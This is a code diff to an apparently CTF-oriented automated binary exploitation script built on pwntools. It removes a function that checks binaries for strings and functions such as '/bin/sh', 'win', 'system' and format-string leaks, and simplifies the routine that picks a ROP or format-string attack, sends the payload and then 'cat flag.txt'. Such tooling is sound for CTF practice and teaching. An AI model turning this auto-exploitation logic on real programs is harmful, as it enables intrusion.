@@ -24,7 +24,7 @@ MM88MMM ,adPPYYba, 8b,dPPYba, MM88MMM
 fire = "\U0001F525"
 
 gs = '''
-b vuln
+b win
 continue
 '''
 context.terminal = ["tmux", "splitw", "-h"]
@@ -36,101 +36,21 @@ def start(binary):
     else:
         return process(e.path)
 
-
-def check_vuln_type(binary):
-    properties = {} 
-    if binary.has_binsh():
-        print("[+] String of interest: 'binsh' present")
-        properties["binsh"] = True
-    else:
-        properties["binsh"] = False
-
-    if binary.has_flagtxt():
-        print("[+] String of interest: 'flag.txt' present")
-        properties["flag"] = True
-    else:
-        properties["flag"] = False
-
-    if binary.has_catflagtxt():
-        print("[+] String of interest: 'cat flag.txt' present")
-        properties["cat"] = True
-    else:
-        properties["cat"] = False
-
-    if binary.has_gets():
-        print("[+] Gets present")
-        properties["gets"] = True
-    else:
-        properties["gets"] = False
-
-    if binary.has_win():
-        print("[+] Win function present")
-        properties["win"] = True
-    else:
-        properties["win"] = False
-
-    if binary.has_system():
-        print("[+] System function present")
-        properties["system"] = True
-    else:
-        properties["system"] = False
-
-    if binary.has_printf():
-        print("[+] Printf function present")
-        properties["printf"] = True
-    else:
-        properties["printf"] = False
-
-    if binary.has_syscall():
-        print("[+] Syscall function present")
-        properties["syscall"] = True
-    else:
-        properties["syscall"] = False
-
-    if binary.has_leak():
-        print("[+] Possible format string bug")
-        properties["format"] = True
-    else:
-        properties["format"] = False
-
-    if binary.has_execve():
-        print("[+] Execve function present")
-        properties["execve"] = True
-    else:
-        properties["execve"] = False
-
-    if binary.has_rop():
-        print("[+] Possible ROP conditions")
-        properties["rop"] = True
-    else:
-        properties["rop"] = False
-
-    return properties
-
-def exploit(analyize, properties):
+def exploit(analyize):
     binary = analyze.binary
     p = start(binary)
     payload = None
     
-    if properties["rop"]:
-        rop = Fart_ROP.ROP(analyze, properties)
-    elif properties["format"]:
-        fmt = Fart_FMT.FMT(analyze, properties)
+    if not analyze.has_leak():
+        rop = Fart_ROP.ROP(analyze)
+        send(rop.build_exploit(), p, analyze)
+    else:
+        fmt = Fart_FMT.FMT(analyze)
 
-    if properties["win"] and properties["rop"]:
-        payload = rop.ret2win()
-    elif properties["execve"] and properties["rop"]:
-        payload = rop.ret2execve()
-    elif properties["syscall"] and properties["rop"]:
-        payload = rop.ret2syscall()
-    elif properties["system"] and properties["rop"]:
-        payload = rop.ret2system()
-    elif properties["format"] and properties["printf"]:
-        print(analyze.has_leak())
-
+def send(payload, p, analyze):
     if payload:
         p.sendline(payload)
-        if properties["binsh"]:
+        if analyze.has_binsh():
             sleep(0.1)
             p.sendline(b"cat flag.txt")
         p.recvuntil(b"flag")
@@ -145,5 +65,4 @@ if __name__ == "__main__":
     print(banner)
     
     analyze = Analyze(binary)
-    properties = check_vuln_type(analyze)
-    exploit(analyze, properties)
+    exploit(analyze)
